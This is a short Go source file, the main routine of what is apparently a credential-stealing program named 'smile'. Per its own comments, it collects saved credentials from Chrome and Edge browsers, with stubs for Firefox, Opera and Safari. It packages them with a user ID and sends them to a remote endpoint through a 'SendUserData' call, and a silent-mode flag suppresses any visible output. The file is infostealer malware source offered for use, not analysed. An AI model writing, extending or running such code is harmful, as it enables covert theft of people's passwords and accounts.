package main

import (
	"fmt"
	"smile/browsers"
	"smile/config"
	"smile/requests"
)

func main() {
	config.SetConfig();

	Data := []browsers.BrowserConfig{}

	// Retrieve credentials from browsers
	Data = append(Data, browsers.Chrome())
	// Data = append(Data, browsers.Firefox());
	Data = append(Data, browsers.Edge())
	// Data = append(Data, browsers.Opera());
	// Data = append(Data, browsers.Safari());

	// store config.USER_ID and Data in object "data"
	data := map[string]interface{}{
		"userId": config.USER_ID,
		"data": Data,
	}

	response, err := requests.SendUserData(data)
	if err != nil {
		fmt.Println(err)
	}

	if !config.SILENT {
		fmt.Println(response);
	}
}